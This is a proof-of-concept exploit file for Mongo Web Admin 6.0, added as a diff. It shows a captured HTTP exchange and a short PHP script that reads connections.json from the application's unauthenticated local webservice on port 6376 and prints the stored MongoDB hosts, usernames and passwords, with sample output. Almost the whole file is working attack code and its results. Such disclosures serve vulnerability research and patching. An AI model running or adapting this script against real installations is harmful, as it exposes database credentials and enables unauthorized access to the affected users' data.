@@ -1,0 +1,73 @@
+# Exploit Title: Mongo Web Admin 6.0 - Information Disclosure
+# Dork: N/A
+# Date: 2018-11-04
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.mongoadmin.org/
+# Software Link: https://netix.dl.sourceforge.net/project/mongo-web-admin/mongoDesktopAdminSetup-beta-6.exe
+# Version: 6.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# Status/Protocol/Local host/Local port/Remote host/Remote port/PID/Process name
+# Established/TCP/127.0.0.1/6376/127.0.0.1/6393/4520/mongoDesktopAdmin
+# Established/TCP/127.0.0.1/6376/127.0.0.1/6394/4520/mongoDesktopAdmin
+# Established/TCP/127.0.0.1/6393/127.0.0.1/6376/4520/mongoDesktopAdmin
+# Established/TCP/127.0.0.1/6394/127.0.0.1/6376/4520/mongoDesktopAdmin
+
+GET /test.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,* /*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/
+Cookie: PHPSESSID=npbo6p4par2h1flfvc4lv04ok4; mongo-web-admin-session=bvf9kg9nod2gttd6rstk2l4q30
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+HTTP/1.1 200 OK
+Date: Sun, 04 Nov 2018 16:27:16 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 490
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+header ('Content-type: text/html; charset=UTF-8');
+
+$urlemiz= "http://127.0.0.1:6376/webservice/Data/";
+$y="connections.json";
+$jsonveri = file_get_contents($urlemiz.$y);
+$ver = json_decode($jsonveri,true);
+echo "<pre>\n";
+print_r($ver);
+echo "\n</pre>";
+/**
+Array
+(
+    [0] => Array
+        (
+            [id] => 0.81395000 1342373198
+            [name] => Default
+            [host] => localhost
+            [port] => 27017
+            [user] => user1
+            [password] => pass1
+        )
+
+    [1] => Array
+        (
+            [id] => 0.54691200 1541333748
+            [name] => New connection
+            [host] => localhost
+            [port] => 27017
+            [user] => user2
+            [password] => pass2
+        )
+
+)
